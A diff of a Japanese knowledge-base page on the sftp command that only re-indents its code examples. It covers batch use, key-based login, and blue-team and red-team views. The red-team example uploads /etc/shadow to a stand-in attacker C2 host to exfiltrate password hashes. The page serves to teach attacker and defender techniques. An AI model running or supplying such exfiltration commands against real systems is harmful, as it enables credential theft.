@@ -42,17 +42,17 @@ knowledge_category: Command
 * **解説**: `get` や `put` などの `sftp` 内部コマンドを記述したバッチファイルを作成し、`-b` オプションでそれを指定して `sftp` を実行します。これにより、非対話的なファイル転送を実現できます。
 * **コマンド例**:
 
-		```bash
-		# batchfile.txt の中身
-		# cd /var/log/app
-		# mget *.log
-		# quit
+	```bash
+	# batchfile.txt の中身
+	# cd /var/log/app
+	# mget *.log
+	# quit
 
-		# バッチファイルを指定してsftpを実行
+	# バッチファイルを指定してsftpを実行
 
-		sftp -b batchfile.txt user@remote-server
+	sftp -b batchfile.txt user@remote-server
 
-		```
+	```
 
 ## オプション説明 (`sftp` 内部のコマンド)
 
@@ -83,20 +83,20 @@ knowledge_category: Command
 * **解説**: 秘密鍵を指定してサーバーに接続し、`cd`, `ls`, `get`, `put` を使ってファイルや設定をやり取りする、最も基本的な使い方です。
 * **例**:
 
-		```bash
-		# サーバーに接続
+	```bash
+	# サーバーに接続
 
-		sftp -i ~/.ssh/prod-key.pem admin@prod-server
+	sftp -i ~/.ssh/prod-key.pem admin@prod-server
 
-		# sftpプロンプトで操作
+	# sftpプロンプトで操作
 
-		sftp> cd /etc/nginx/conf.d
+	sftp> cd /etc/nginx/conf.d
 
-		sftp> get default.conf
+	sftp> get default.conf
 
-		sftp> quit
+	sftp> quit
 
-		```
+	```
 
 ## 2. ブルーチーム視点
 
@@ -105,15 +105,15 @@ knowledge_category: Command
 * **解説**: `scp` でディレクトリ全体をコピーするのではなく、`sftp` の対話セッションで `/tmp` や `/home` を探索し、タイムスタンプやファイルサイズから不審なファイルだけを特定し、`get` コマンドで選択的に収集します。
 * **例**:
 
-		```bash
+	```bash
 
-		sftp analyst@compromised-host
+	sftp analyst@compromised-host
 
-		sftp> ls -l /tmp
+	sftp> ls -l /tmp
 
-		sftp> get /tmp/evil.sh
+	sftp> get /tmp/evil.sh
 
-		```
+	```
 
 ## 3. レッドチーム視点
 
@@ -122,16 +122,16 @@ knowledge_category: Command
 * **解説**: 攻撃者はシステム侵入後、`sftp` を使って自身のC2サーバーに接続し、`put stolen_data.zip` のように窃取したデータをアップロードしたり、`get nmap` のように次の攻撃で必要となるツールを追加でダウンロードしたりします。
 * **例**:
 
-		```bash
-		# C2サーバーに接続
+	```bash
+	# C2サーバーに接続
 
-		sftp attacker@c2.example.com
+	sftp attacker@c2.example.com
 
-		# 窃取したパスワードハッシュをアップロード
+	# 窃取したパスワードハッシュをアップロード
 
-		sftp> put /etc/shadow
+	sftp> put /etc/shadow
 
-		```
+	```
 
 ## エラーメッセージとトラブルシューティング
 
